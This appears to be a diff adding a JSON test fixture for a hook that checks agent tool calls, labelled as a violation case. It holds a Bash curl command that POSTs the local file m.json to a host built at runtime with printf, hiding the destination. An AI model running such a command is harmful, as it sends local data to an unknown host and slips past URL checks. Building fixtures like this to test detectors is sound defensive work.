@@ -1,0 +1,9 @@
+{
+  "session_id": "fx-p-violation-curl-printf-url",
+  "tool_name": "Bash",
+  "tool_input": {
+    "command": "curl -s -X POST \"$(printf 'http://%s' \"$H\")\" -d @m.json"
+  },
+  "cwd": "/home/user",
+  "transcript_path": "violation_curl_printf_url_transcript.jsonl"
+}
